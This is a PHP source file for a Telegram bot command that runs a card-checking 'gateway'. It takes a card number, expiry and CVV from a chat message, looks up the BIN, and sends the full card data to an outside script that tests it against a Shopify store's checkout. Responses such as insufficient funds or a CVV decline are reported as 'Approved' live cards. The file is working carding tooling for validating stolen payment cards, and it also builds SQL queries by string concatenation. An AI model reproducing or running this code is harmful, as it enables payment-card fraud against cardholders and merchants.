<?php
if (is_valid_command($text, array("nd"))) {
    if (!checkBotStatus($chat_id, $msg_id)) {
    return;
}
if (!isUserAllowed($user_id, $chat_id, $msg_id)) {
    return;
}
autoRegisterUser($user_id, $username, $chat_id, $msg_id);
if (!get_authorize($chat_id, $msg_id)) {
        return;
}
$listan = clean($text);
$listaq = clean($quetzal);
if(empty($listan)){
$lista = $listaq;
}elseif(empty($listaq)){
$lista = $listan;
}
// Call Mysql Users And Chat
$sql = "SELECT * FROM administrar WHERE id='$user_id'";
$cs = mysqli_query(mysqlcon(),$sql);
$raw = mysqli_fetch_assoc($cs);
$title = $raw['rango'];
mysqli_close(mysqlcon());
$sql = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
$cs = mysqli_query(mysqlcon(),$sql);
$raw = mysqli_fetch_assoc($cs);
$chats = $raw['chats'];
$now = time();

 if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "<b><i>Gateway え [Nandayo][Shopify] 2</i></b>
Use: <b>\$nd cc|mes|ano|cvv</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    } else {}

$matches = $lista;
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $lista, $matches);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$fecha = ''.$mes.''.$ano.'';
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);
$lista = "$cc|$mes|$ano|$cvv";


        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "Forbidden: <b>[Card Invalid]</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "Forbidden: <b>[Card Invalid 15<]</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        
     $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $antispam2 = $RAW['antispam2'];
     $time =   str_replace('s','',$antispam2);
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < $time)
        {
            $TotalTime = $time - $TIMEAC;
            if($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>[ANTISPAM] Try again after $TotalTime's</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }


        $che = bannedbin($bin);
        if($che == true){
                $content = ['chat_id' => $chat_id, 'text' => "Forbidden: <b>[Bin Blocked leccher]</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                $m1  = SendMessage($content);
                exit();
        }
$starttime = microtime(true);
$mytime = 'time1';
        $timest = time();
        $SQL = "UPDATE administrar SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
        $content = ['chat_id' => $chat_id, 'text' => "<b><i>Wait while your card is processed</i></b>
Card え <code>$lista</code>
Took え <i>{$mytime($starttime)}(s)</i>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
      $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];
//bin Lookup
$fim = json_decode(file_get_contents('https://hestiaccbot.alwaysdata.net/Apibin.php?binsearch=' . $bin), true);
$level = $fim["level"];
$type = $fim["type"];
$brand = $fim["brand"];
$country = $fim["country_name"];
$emoji = $fim["flag"];
$currency = $fim["currency"];
$bank = $fim['bank_name'];
$bankphone = $fim["bank_phone"];

$content2 = ['chat_id' => $chat_id, 'text' => "<b><i>Wait while your card is processed</i></b>
Card え <code>$lista</code>
Took え <i>{$mytime($starttime)}(s)</i>", 'message_id' => $m1i, 'parse_mode' => 'html'];
$m2  = EditMessageText($content2);
        $m2i = $m2['result']['message_id'];

$content3 = ['chat_id' => $chat_id, 'text' => "<b><i>Wait while your card is processed</i></b>
Card え <code>$lista</code>
Took え <i>{$mytime($starttime)}(s)</i>", 'message_id' => $m2i, 'parse_mode' => 'html'];
$m3 = EditMessageText($content3);
        $m3i = $m3['result']['message_id'];
 
 $content = ['chat_id' => $chat_id, 'text' => "<b><i>Wait while your card is processed</i></b>
Card え <code>$lista</code>
Took え <i>{$mytime($starttime)}(s)</i>", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m4  = EditMessageText($content);
        $m4i = $m4['result']['message_id'];
        
//Request Gateway Lookup
// URL de la página
$url = "http://anthony086.alwaysdata.net/Shopify/B3.php?lista=$lista&pagina=https://www.oxford.shop";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
curl_close($ch);
$resultado = json_decode($response, true);
$status = $resultado['status'];
$card = $resultado['card'];
$result = $resultado['result'];
$amount = $resultado['Amount'];
$took = $resultado['Took'];
//sleep(15);

$codeslives = array('2001 Insufficient Funds', '2010 Card Issuer Declined CVV', 'Billing address must match shipping address. Please use a different payment method.');

if(in_array($result, $codeslives)) {
	$status = "Approved ✅️";
}else{
	$status = "Declined ❌️";
}

$contentf = ['chat_id' => $chat_id, 'text' => "Card え <code>$lista</code>
Status え <b>[ $status ]</b>
Message え <b><i>$result</i></b>
- - - - - - - - - - - - - - - - - - - - - - - - - - 
Bin え <b><i>$bin</i></b>
Info え <b><i>$brand - $type - $level</i></b>
Bank え <b><i>$bank</i></b>
Country え <b><i>$country [$emoji]</i></b>
- - - - - - - - - - - - - - - - - - - - - - - - - - 
Amount え $<i>$amount</i>
Proxy え <b>Live ✅</b>
Took え <i>{$mytime($starttime)}s </i>
Request By え <b>$username1 [$title]</b>", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($contentf);
      
}
